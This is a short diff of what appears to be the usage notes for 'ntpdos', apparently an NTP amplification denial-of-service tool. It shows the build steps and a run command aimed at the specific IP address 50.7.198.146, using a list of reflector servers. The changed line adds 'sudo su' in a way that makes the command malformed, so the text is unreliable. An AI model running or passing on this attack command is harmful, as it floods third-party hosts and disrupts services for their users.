@@ -8,7 +8,7 @@ cd ntpdos2
 
 make
 
-./ntpdos -t 50.7.198.146 -S servers.lst -p 4
+sudo su ./ntpdos -t 50.7.198.146 -S servers.lst -p 4
 
 <a href="https://www.raulprietofernandez.net/blog/gnu-linux/como-instalar-un-servidor-de-ntp-en-gnu-linux-ubuntu-server">ntp</a>
 
